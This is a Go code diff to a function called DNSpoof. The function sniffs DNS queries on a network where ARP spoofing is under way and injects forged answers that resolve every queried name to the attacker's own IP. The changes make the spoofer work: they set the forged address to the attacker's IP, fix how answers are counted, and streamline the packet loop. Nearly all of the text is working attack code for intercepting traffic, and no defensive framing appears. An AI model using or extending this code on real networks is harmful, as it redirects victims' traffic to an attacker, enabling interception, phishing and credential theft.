@@ -11,6 +11,7 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+// DNSpoof opens a handle, sniffs for dns packets on the victim machine when arp spoofing and injects/malforms the dns answer for the victim making attacker as dns server
 func DNSpoof() {
 	ifi, err := hdisc.LocalIface()
 	if err != nil {
@@ -44,15 +45,14 @@ func DNSpoof() {
 
 	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
 
-	decoded := make([]gopacket.LayerType, 4)
+	decoded := make([]gopacket.LayerType, 0, 4)
 
 	log.Println("DNS spoofing starting...")
 
 	a.Type = layers.DNSTypeA
 	a.Class = layers.DNSClassIN
 	a.TTL = 300
-	// a.IP = localIP
-	a.IP = net.ParseIP("142.250.72.206")
+	a.IP = localIP.To4() // attackers IP
 
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
@@ -70,7 +70,7 @@ func DNSpoof() {
 	// loop iterator
 	var i uint16
 
-	// loop for intercepting just dns packets and sending forged responses
+	// loop for intercepting just dns packets and injecting malformed dns answers
 	for {
 		data, _, err := handle.ZeroCopyReadPacketData()
 		if err != nil {
@@ -82,10 +82,10 @@ func DNSpoof() {
 			continue
 		}
 
-		log.Println("Got a dns packet from filter")
+		// log.Println("Got a dns packet from filter")
 
-		// skip if it is a packet from my own machine
-		if ipv4Layer.SrcIP.Equal(localIP) {
+		// skip itself or if is a response
+		if ipv4Layer.SrcIP.Equal(localIP) || dnsLayer.QR {
 			continue
 		}
 
@@ -94,23 +94,24 @@ func DNSpoof() {
 			continue
 		}
 
-		// check for a resposne
-		if dnsLayer.QR {
-			continue
-		}
-
-		for i = 0; i < dnsLayer.QDCount; i++ {
-			fmt.Println(string(dnsLayer.Questions[i].Name))
-		}
+		// for i = 0; i < dnsLayer.QDCount; i++ {
+		// 	fmt.Println(string(dnsLayer.Questions[i].Name))
+		// }
 
 		dnsLayer.Answers = nil // clear out previous answers
 		dnsLayer.QR = true
 
+		// allow recursion if wanted
 		if dnsLayer.RD {
 			dnsLayer.RA = true
 		}
 
 		for i = 0; i < dnsLayer.QDCount; i++ {
+
+			// possibly filter out for a specific URL
+			// if !bytes.Equal(q.Name, target) {
+			// 	continue
+			// }
 
 			q = dnsLayer.Questions[i]
 
@@ -121,10 +122,11 @@ func DNSpoof() {
 			a.Name = q.Name
 
 			dnsLayer.Answers = append(dnsLayer.Answers, a)
-			dnsLayer.ANCount = 1
+			dnsLayer.ANCount += 1
 
 		}
-		// now swap variables for it to send the forged dns response
+
+		// now swap variables for it to inject the forged dns answer
 		hAddr = ethLayer.SrcMAC
 		ethLayer.SrcMAC = ethLayer.DstMAC
 		ethLayer.DstMAC = hAddr
@@ -149,8 +151,8 @@ func DNSpoof() {
 			log.Fatalf("Error writing packet data: %s\n", err)
 		}
 
-		log.Println("Sent the DNS response")
+		// log.Println("Sent the DNS response")
 
-		continue // or can be commented to move on to debugging part
+		continue
 	}
 }
